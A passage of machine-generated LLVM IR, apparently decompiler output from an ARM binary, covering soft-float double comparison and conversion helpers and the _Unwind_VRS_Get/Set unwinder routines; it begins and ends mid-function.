  %v9_3085c84 = mul i32 %v6_30854, 1048576
  %v10_3085c85 = or i32 %v9_3085c84, %v5_30850
  store i32 %v10_3085c85, i32* %r1.global-to-local, align 4
  store i32 %v3_306e4, i32* %r4.global-to-local, align 4
  store i32 %v6_306e4, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_30864 = phi i32 [ %v12_306e4, %bb108 ], [ %v1_3084c, %bb107 ]
  %v6_30864 = xor i1 %v4_3085c, true
  call void @__pseudo_cond_branch(i1 %v6_30864, i32 %v0_30864)
  %v0_30868 = load i32, i32* %r1.global-to-local, align 4
  %v1_30868 = or i32 %v0_30868, 1048576
  store i32 %v1_30868, i32* @r1, align 4
  %v0_30870 = load i32, i32* %r4.global-to-local, align 4
  %v1_30870 = add i32 %v0_30870, -1
  store i32 %v1_30870, i32* @r4, align 4
  %v3_30870 = sub i32 0, %v0_30870
  %v4_30870 = and i32 %v0_30870, %v3_30870
  %v5_30870 = icmp slt i32 %v4_30870, 0
  store i1 %v5_30870, i1* @cpsr_v, align 1
  %v6_30870 = icmp slt i32 %v1_30870, 0
  store i1 %v6_30870, i1* @cpsr_n, align 1
  %v7_30870 = icmp eq i32 %v0_30870, 1
  store i1 %v7_30870, i1* @cpsr_z, align 1
  %v0_30874 = call i32 @function_30540()
  store i32 %v0_30874, i32* @r0, align 4
  %v0_3087c = call i32 @function_30540()
  store i32 %v0_3087c, i32* @r0, align 4
  %v0_30880.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_30884.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_30880

dec_label_pc_30880:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_30880.pre-phi = phi i32 [ %v5_306f4, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_306f4, %bb91 ], [ %v5_306f4, %.thread ]
  %v0_30884 = phi i32 [ %v5_306f0, %.thread1 ], [ %v5_306f0, %.thread2 ], [ %v5_306f0, %bb91 ], [ %v0_30884.pre, %.thread ]
  %v2_30888 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_30880.pre, %.thread ]
  %v5_30880 = and i32 %v2_30888, %v4_30880.pre-phi
  store i32 %v5_30880, i32* @r5, align 4
  %v4_30884 = icmp eq i32 %v2_30888, %v0_30884
  br i1 %v4_30884, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_30880
  %v5_30888 = icmp eq i32 %v5_30880, %v2_30888
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_30880, %bb109
  %v0_3088c = phi i1 [ false, %dec_label_pc_30880 ], [ %v5_30888, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_3088c, i32 ptrtoint (i32* @global_var_306d4.3622 to i32))
  %v0_30890 = load i32, i32* @r4, align 4
  %v1_30890 = load i32, i32* %ip.global-to-local, align 4
  %v4_30890 = icmp eq i32 %v1_30890, %v0_30890
  br i1 %v4_30890, label %dec_label_pc_30898, label %dec_label_pc_308b4

dec_label_pc_30898:                               ; preds = %bb110
  %v0_30898 = load i32, i32* @r0, align 4
  %v1_30898 = load i32, i32* @r1, align 4
  %v4_30898 = mul i32 %v1_30898, 4096
  %v5_30898 = or i32 %v4_30898, %v0_30898
  store i32 %v5_30898, i32* %r4.global-to-local, align 4
  %v1_3089c = icmp ne i32 %v5_30898, 0
  call void @__pseudo_cond_branch(i1 %v1_3089c, i32 ptrtoint (i32* @global_var_306d4.3622 to i32))
  %v0_308a0 = load i32, i32* @r5, align 4
  %v1_308a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_308a4 = icmp ne i32 %v1_308a0, %v0_308a0
  call void @__pseudo_cond_branch(i1 %v1_308a4, i32 ptrtoint (i32* @global_var_306b8.3623 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_308b0 = call i32 @function_306d4(i32 %arg3, i32 %arg4)
  store i32 %v2_308b0, i32* @r0, align 4
  %v1_308b4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_308b4

dec_label_pc_308b4:                               ; preds = %bb110, %dec_label_pc_30898
  %v1_308b4 = phi i32 [ %v1_30890, %bb110 ], [ %v1_308b4.pre, %dec_label_pc_30898 ]
  %v0_308b4 = load i32, i32* @r5, align 4
  %v4_308b4 = icmp eq i32 %v0_308b4, %v1_308b4
  br i1 %v4_308b4, label %dec_label_pc_308bc, label %dec_label_pc_308b4.dec_label_pc_308d0_crit_edge

dec_label_pc_308b4.dec_label_pc_308d0_crit_edge:  ; preds = %dec_label_pc_308b4
  %v0_308d0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_308d0

dec_label_pc_308bc:                               ; preds = %dec_label_pc_308b4
  %v4_308bc = mul i32 %arg4, 4096
  %v5_308bc = or i32 %v4_308bc, %arg3
  store i32 %v5_308bc, i32* %r5.global-to-local, align 4
  %v7_308bc = icmp eq i32 %v5_308bc, 0
  call void @__pseudo_cond_branch(i1 %v7_308bc, i32 ptrtoint (i32* @global_var_30668.3624 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_308cc = call i32 @function_306d4(i32 %arg3, i32 %arg4)
  store i32 %v2_308cc, i32* @r0, align 4
  br label %dec_label_pc_308d0

dec_label_pc_308d0:                               ; preds = %dec_label_pc_308b4.dec_label_pc_308d0_crit_edge, %dec_label_pc_308bc
  %v0_308d0 = phi i32 [ %v0_308d0.pre, %dec_label_pc_308b4.dec_label_pc_308d0_crit_edge ], [ %v2_308cc, %dec_label_pc_308bc ]
  %v1_308d0 = load i32, i32* @r1, align 4
  %v3_308d0 = mul i32 %v1_308d0, 2
  %v4_308d0 = or i32 %v3_308d0, %v0_308d0
  store i32 %v4_308d0, i32* %r6.global-to-local, align 4
  %v6_308d0 = icmp eq i32 %v4_308d0, 0
  br i1 %v6_308d0, label %dec_label_pc_308d0._crit_edge, label %bb111

dec_label_pc_308d0._crit_edge:                    ; preds = %dec_label_pc_308d0
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_308d0
  %v4_308d4 = mul i32 %arg4, 2
  %v5_308d4 = or i32 %v4_308d4, %arg3
  store i32 %v5_308d4, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_308d4, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_308d0._crit_edge, %bb111
  %v4_308e4.pre-phi = phi i32 [ %.pre80, %dec_label_pc_308d0._crit_edge ], [ %v5_308d4, %bb111 ]
  %v0_308d8 = phi i1 [ false, %dec_label_pc_308d0._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_308d8, i32 ptrtoint (i32* @global_var_30600.3625 to i32))
  %v0_308dc = load i32, i32* @r0, align 4
  %v1_308dc = load i32, i32* @r1, align 4
  %v3_308dc = mul i32 %v1_308dc, 2
  %v4_308dc = or i32 %v3_308dc, %v0_308dc
  store i32 %v4_308dc, i32* %r4.global-to-local, align 4
  %v1_308e0 = icmp ne i32 %v4_308dc, 0
  call void @__pseudo_cond_branch(i1 %v1_308e0, i32 ptrtoint (i32* @global_var_306b8.3623 to i32))
  store i32 %v4_308e4.pre-phi, i32* %r5.global-to-local, align 4
  %v1_308e8 = icmp ne i32 %v4_308e4.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_308e8, i32 ptrtoint (i32* @global_var_30668.3624 to i32))
  %v0_308ec = load i32, i32* @r0, align 4
  %v1_308ec = load i32, i32* @r1, align 4
  %v2_308ec = call i32 @function_306d4(i32 %v0_308ec, i32 %v1_308ec)
  store i32 %v2_308ec, i32* %r0.global-to-local, align 4
  ret i32 %v2_308ec

; uselistorder directives
  uselistorder i32 %v5_308d4, { 1, 0, 2 }
  uselistorder i32 %v1_30890, { 1, 0 }
  uselistorder i32 %v1_30870, { 1, 0 }
  uselistorder i32 %v0_30870, { 3, 1, 0, 2 }
  uselistorder i32 %v10_30858, { 2, 0, 1 }
  uselistorder i32 %v6_30854, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_3084c, { 1, 0 }
  uselistorder i32 %v2_30834, { 1, 0, 2 }
  uselistorder i32 %v1_30834, { 1, 0, 2 }
  uselistorder i32 %v1_30830, { 1, 0, 2 }
  uselistorder i32 %v0_30830, { 1, 0, 2 }
  uselistorder i1 %v7_30824, { 1, 0 }
  uselistorder i32 %v2_30808, { 1, 0 }
  uselistorder i32 %v3_307f4, { 2, 1, 0 }
  uselistorder i32 %v3_307e8, { 0, 2, 1 }
  uselistorder i32 %v5_307e4, { 2, 0, 1 }
  uselistorder i32 %v6_307d4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_307c0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_307bc, { 3, 0, 2, 1 }
  uselistorder i32 %v0_307c8, { 0, 2, 1 }
  uselistorder i32 %v1_307d4, { 1, 0 }
  uselistorder i32 %v6_307b8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_307a4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_307a0, { 0, 2, 1 }
  uselistorder i32 %v0_307ac, { 0, 2, 1 }
  uselistorder i32 %v1_307b8, { 1, 0 }
  uselistorder i32 %v6_3079c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_30788, { 1, 2, 0, 3 }
  uselistorder i32 %v0_30790, { 0, 2, 1 }
  uselistorder i32 %v1_3079c, { 1, 0 }
  uselistorder i32 %v3_30780, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_30774, { 1, 2, 0 }
  uselistorder i32 %v3_307f413, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_307f017, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_30774, { 0, 3, 2, 1 }
  uselistorder i32 %v1_30780, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_3081c.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_30760, { 1, 0 }
  uselistorder i32 %v0_30764, { 1, 0 }
  uselistorder i32 %v3_30750, { 1, 0 }
  uselistorder i1 %v1_30744, { 1, 0 }
  uselistorder i32 %v3_30734, { 2, 3, 1, 0 }
  uselistorder i32 %v5_30730, { 3, 2, 1, 0 }
  uselistorder i32 %v3_30728, { 2, 1, 0 }
  uselistorder i32 %v5_30724, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_30704, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_306f4, { 2, 3, 1, 0 }
  uselistorder i32 %v5_306f4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_306f0, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_306f0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_306e4, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 8, 6, 7, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 9, 1, 6, 7, 2, 3, 4, 5, 8, 0 }
  uselistorder i32* %ip.global-to-local, { 6, 8, 9, 7, 1, 2, 3, 4, 5, 0, 10 }
  uselistorder i32 (i32, i32)* @function_306d4, { 2, 1, 0 }
  uselistorder i32 ()* @function_30540, { 1, 0 }
  uselistorder i32 1024, { 3, 0, 8, 5, 6, 7, 1, 9, 4, 10, 2 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 33, { 5, 6, 7, 3, 8, 9, 10, 0, 2, 1, 4 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 1048576, { 20, 0, 1, 2, 21, 22, 13, 3, 4, 5, 23, 6, 7, 24, 25, 16, 17, 8, 9, 26, 27, 28, 19, 29, 10, 14, 11, 18, 12, 30, 15, 31 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32 %arg4, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 7, 6, 4, 9, 8, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_308d0, { 1, 0 }
  uselistorder label %dec_label_pc_308b4, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_30880, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_30770, { 1, 0 }
  uselistorder label %dec_label_pc_30758, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_308f4 = call i32 @function_30904()
  ret i32 %v0_308f4
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_308fc = call i32 @function_30904()
  ret i32 %v0_308fc

; uselistorder directives
  uselistorder i32 ()* @function_30904, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_30900 = load i32, i32* @r0, align 4
  ret i32 %v0_30900
}

define i32 @function_30904() local_unnamed_addr {
dec_label_pc_30904:
  %v0_30904 = load i32, i32* @ip, align 4
  %v0_30908 = load i32, i32* @r1, align 4
  %v2_30908 = mul i32 %v0_30908, 2
  %v2_30908.off = add i32 %v2_30908, 4194303
  %tmp = icmp ult i32 %v2_30908.off, 2097152
  %v0_30910 = load i32, i32* @r3, align 4
  %v2_30910 = mul i32 %v0_30910, 2
  br i1 %tmp, label %dec_label_pc_30960, label %bb

bb:                                               ; preds = %dec_label_pc_30904
  %v2_30910.off = add i32 %v2_30910, 4194303
  %tmp21 = icmp ult i32 %v2_30910.off, 2097152
  br i1 %tmp21, label %dec_label_pc_30954, label %dec_label_pc_3091c

dec_label_pc_3091c:                               ; preds = %dec_label_pc_30968, %dec_label_pc_30974, %bb
  %v0_3091c = load i32, i32* @r0, align 4
  %v4_3091c = or i32 %v0_3091c, %v2_30908
  %v6_3091c = icmp eq i32 %v4_3091c, 0
  br i1 %v6_3091c, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_3091c
  %v1_30920 = load i32, i32* @r2, align 4
  %v5_30920 = or i32 %v1_30920, %v2_30910
  %v7_30920 = icmp eq i32 %v5_30920, 0
  br i1 %v7_30920, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_3091c, %bb10
  %v5_30924 = icmp eq i32 %v0_30910, %v0_30908
  br i1 %v5_30924, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_30928.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_30928 = phi i32 [ %v2_30928.pre, %.thread..thread1_crit_edge ], [ %v1_30920, %bb10 ]
  %v5_30928 = icmp eq i32 %v2_30928, %v0_3091c
  br i1 %v5_30928, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_30930 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_30930 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_30930, i32 %v0_30930)
  %v0_30934 = load i32, i32* @r0, align 4
  %v0_30938 = load i32, i32* @r1, align 4
  %v1_30938 = load i32, i32* @r3, align 4
  %v2_30938 = xor i32 %v1_30938, %v0_30938
  %v3_30938 = icmp slt i32 %v2_30938, 0
  br i1 %v3_30938, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_3093c = icmp eq i32 %v0_30938, %v1_30938
  br i1 %v10_3093c, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_30940 = load i32, i32* @r2, align 4
  %v4_30940 = icmp ult i32 %v0_30934, %v2_30940
  br i1 %v4_30940, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_3093c = icmp ult i32 %v0_30938, %v1_30938
  br i1 %v4_3093c, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_30938, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_30944 = and i32 %v1_30938, 1073741824
  %v3_30944 = icmp eq i32 %v2_30944, 0
  %v4_30944 = ashr i32 %v1_30938, 31
  br i1 %v3_30944, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_30948.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_30944, %bb15 ]
  %v5_30948 = sub nsw i32 -1, %v4_30948.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_3094c = phi i32 [ %v4_30944, %bb15 ], [ %v5_30948, %.thread3 ]
  %v1_3094c = or i32 %v0_3094c, 1
  ret i32 %v1_3094c

dec_label_pc_30954:                               ; preds = %bb
  br label %dec_label_pc_30968

dec_label_pc_30960:                               ; preds = %dec_label_pc_30904
  %v0_30960 = load i32, i32* @r0, align 4
  %v4_30960 = mul i32 %v0_30908, 4096
  %v5_30960 = or i32 %v0_30960, %v4_30960
  %v7_30960 = icmp eq i32 %v5_30960, 0
  br i1 %v7_30960, label %dec_label_pc_30960.dec_label_pc_30968_crit_edge, label %dec_label_pc_3097c

dec_label_pc_30960.dec_label_pc_30968_crit_edge:  ; preds = %dec_label_pc_30960
  %v2_30910.off20 = add i32 %v2_30910, 4194303
  %tmp22 = icmp ult i32 %v2_30910.off20, 2097152
  br label %dec_label_pc_30968

dec_label_pc_30968:                               ; preds = %dec_label_pc_30960.dec_label_pc_30968_crit_edge, %dec_label_pc_30954
  %v3_3096c.pre-phi = phi i1 [ %tmp22, %dec_label_pc_30960.dec_label_pc_30968_crit_edge ], [ true, %dec_label_pc_30954 ]
  br i1 %v3_3096c.pre-phi, label %dec_label_pc_30974, label %dec_label_pc_3091c

dec_label_pc_30974:                               ; preds = %dec_label_pc_30968
  %v0_30974 = load i32, i32* @r2, align 4
  %v4_30974 = mul i32 %v0_30910, 4096
  %v5_30974 = or i32 %v0_30974, %v4_30974
  %v7_30974 = icmp eq i32 %v5_30974, 0
  br i1 %v7_30974, label %dec_label_pc_3091c, label %dec_label_pc_3097c

dec_label_pc_3097c:                               ; preds = %dec_label_pc_30960, %dec_label_pc_30974
  ret i32 %v0_30904

; uselistorder directives
  uselistorder i32 %v4_30944, { 1, 0 }
  uselistorder i32 %v1_30938, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_30938, { 2, 1, 0 }
  uselistorder i32 %v1_30920, { 1, 0 }
  uselistorder i32 %v2_30910, { 0, 2, 1 }
  uselistorder i32 %v0_30910, { 1, 0, 2 }
  uselistorder i32 %v2_30908, { 1, 0 }
  uselistorder i32 %v0_30908, { 1, 0, 2 }
  uselistorder i32 31, { 11, 4, 2, 5, 6, 12, 3, 13, 14, 15, 7, 8, 1, 16, 0, 17, 18, 19, 20, 9, 10 }
  uselistorder label %dec_label_pc_3097c, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_3091c, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_30984 = load i32, i32* @r0, align 4
  %v0_30988 = load i32, i32* @r2, align 4
  store i32 %v0_30988, i32* @r0, align 4
  store i32 %v0_30984, i32* @r2, align 4
  %v0_3099c = call i32 @__aeabi_cdcmple()
  ret i32 %v0_3099c
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_309a0 = load i32, i32* @r0, align 4
  %v1_309a4 = sext i32 %v3_309a0 to i64
  %v2_309a4 = bitcast i64 %v1_309a4 to double
  %v3_309a4 = load i32, i32* @r2, align 4
  %v4_309a4 = sext i32 %v3_309a4 to i64
  %v5_309a4 = bitcast i64 %v4_309a4 to double
  %v7_309a4 = fcmp oeq double %v2_309a4, %v5_309a4
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_309a4 = fcmp ule double %v2_309a4, %v5_309a4
  %not.v7_309a4 = xor i1 %v7_309a4, true
  %v1_309a8 = and i1 %not.v6_309a4, %not.v7_309a4
  store i1 %v7_309a4, i1* @cpsr_z, align 1
  br i1 %v1_309a8, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_309a4, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_309a0

; uselistorder directives
  uselistorder i1 %v7_309a4, { 1, 2, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_309bc = call i32 @__aeabi_cdcmple()
  %v0_309c0 = load i1, i1* @cpsr_z, align 1
  %.v0_309bc. = zext i1 %v0_309c0 to i32
  ret i32 %.v0_309bc.
}

define i32 @__aeabi_dcmplt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_309d4 = call i32 @__aeabi_cdcmple()
  %v0_309d8 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_309d8 to i32
  %.v0_309d4. = xor i32 %tmp2, 1
  ret i32 %.v0_309d4.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %v0_309ec = call i32 @__aeabi_cdcmple()
  %v0_309f0 = load i1, i1* @cpsr_z, align 1
  %v1_309f0 = load i1, i1* @cpsr_c, align 1
  %v2_309f0 = xor i1 %v1_309f0, true
  %v3_309f0 = or i1 %v0_309f0, %v2_309f0
  %.v0_309ec = select i1 %v3_309f0, i32 1, i32 %v0_309ec
  %v2_309f4 = xor i1 %v0_309f0, true
  %v3_309f4 = and i1 %v1_309f0, %v2_309f4
  %..v0_309ec = select i1 %v3_309f4, i32 0, i32 %.v0_309ec
  ret i32 %..v0_309ec

; uselistorder directives
  uselistorder i1 %v1_309f0, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_30a00 = load i32, i32* @lr, align 4
  store i32 %v0_30a00, i32* %stack_var_-8, align 4
  %v0_30a04 = call i32 @__aeabi_cdrcmple()
  %v0_30a08 = load i1, i1* @cpsr_z, align 1
  %v1_30a08 = load i1, i1* @cpsr_c, align 1
  %v2_30a08 = xor i1 %v1_30a08, true
  %v3_30a08 = or i1 %v0_30a08, %v2_30a08
  %.v0_30a04 = select i1 %v3_30a08, i32 1, i32 %v0_30a04
  %v2_30a0c = xor i1 %v0_30a08, true
  %v3_30a0c = and i1 %v1_30a08, %v2_30a0c
  %..v0_30a04 = select i1 %v3_30a0c, i32 0, i32 %.v0_30a04
  %v2_30a10 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_30a10, i32* @lr, align 4
  ret i32 %..v0_30a04

; uselistorder directives
  uselistorder i1 %v1_30a08, { 1, 0 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_30a1c = call i32 @__aeabi_cdrcmple()
  %v0_30a20 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_30a20 to i32
  %.v0_30a1c. = xor i32 %tmp2, 1
  ret i32 %.v0_30a1c.

; uselistorder directives
  uselistorder i1* @cpsr_c, { 0, 6, 1, 7, 8, 9, 2, 3, 4, 5 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_30a30 = icmp slt i32 %arg2, 0
  %v2_30a30 = mul i32 %arg2, 2
  br i1 %v1_30a30, label %dec_label_pc_30a64, label %dec_label_pc_30a38

dec_label_pc_30a38:                               ; preds = %entry
  %v1_30a38 = add i32 %v2_30a30, 2097152
  %v2_30a38 = icmp ugt i32 %v2_30a30, -2097153
  br i1 %v2_30a38, label %dec_label_pc_30a6c, label %dec_label_pc_30a40

dec_label_pc_30a40:                               ; preds = %dec_label_pc_30a38
  %v6_30a38 = icmp slt i32 %v1_30a38, 0
  br i1 %v6_30a38, label %dec_label_pc_30a44, label %dec_label_pc_30a64

dec_label_pc_30a44:                               ; preds = %dec_label_pc_30a40
  %v4_30a48 = sdiv i32 %v1_30a38, 2097152
  %v5_30a48 = sub nsw i32 -993, %v4_30a48
  %v11_30a48 = icmp slt i32 %v5_30a48, 0
  br i1 %v11_30a48, label %dec_label_pc_30a74, label %dec_label_pc_30a50

dec_label_pc_30a50:                               ; preds = %dec_label_pc_30a44
  %v3_30a50 = mul i32 %arg2, 2048
  %v4_30a58 = udiv i32 %arg1, 2097152
  %v1_30a54 = or i32 %v4_30a58, %v3_30a50
  %v5_30a58 = or i32 %v1_30a54, -2147483648
  %v6_30a5c = lshr i32 %v5_30a58, %v5_30a48
  ret i32 %v6_30a5c

dec_label_pc_30a64:                               ; preds = %dec_label_pc_30a40, %entry
  ret i32 0

dec_label_pc_30a6c:                               ; preds = %dec_label_pc_30a38
  %v4_30a6c = mul i32 %arg2, 4096
  %v5_30a6c = or i32 %v4_30a6c, %arg1
  %v7_30a6c = icmp eq i32 %v5_30a6c, 0
  br i1 %v7_30a6c, label %dec_label_pc_30a74, label %dec_label_pc_30a7c

dec_label_pc_30a74:                               ; preds = %dec_label_pc_30a6c, %dec_label_pc_30a44
  ret i32 -1

dec_label_pc_30a7c:                               ; preds = %dec_label_pc_30a6c
  ret i32 0

; uselistorder directives
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_30a84 = icmp eq i32 %regclass, 0
  br i1 %v2_30a84, label %dec_label_pc_30a8c, label %dec_label_pc_30abc

dec_label_pc_30a8c:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_30a8c
  %v6_30a90 = icmp eq i32 %representation, 0
  br i1 %v6_30a90, label %dec_label_pc_30aa0, label %bb8

.thread3:                                         ; preds = %dec_label_pc_30a8c
  br label %dec_label_pc_30ac8

bb8:                                              ; preds = %bb
  br label %dec_label_pc_30ac8

dec_label_pc_30aa0:                               ; preds = %bb
  %v3_30aa0 = mul i32 %regno, 4
  %v2_30aa4 = add i32 %v3_30aa0, %context
  %v1_30aa8 = add i32 %v2_30aa4, 4
  %v2_30aa8 = inttoptr i32 %v1_30aa8 to i32*
  %v3_30aa8 = load i32, i32* %v2_30aa8, align 4
  %v2_30ab4 = bitcast i8* %valuep to i32*
  store i32 %v3_30aa8, i32* %v2_30ab4, align 4
  ret i32 0

dec_label_pc_30abc:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_30abc
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_30abc, %bb9
  %v0_30ac4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_30ac4)
  br label %dec_label_pc_30ac8

dec_label_pc_30ac8:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_30ac8, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_30ad0 = icmp eq i32 %regclass, 0
  br i1 %v2_30ad0, label %dec_label_pc_30ad8, label %dec_label_pc_30b08

dec_label_pc_30ad8:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_30ad8
  %v6_30adc = icmp eq i32 %representation, 0
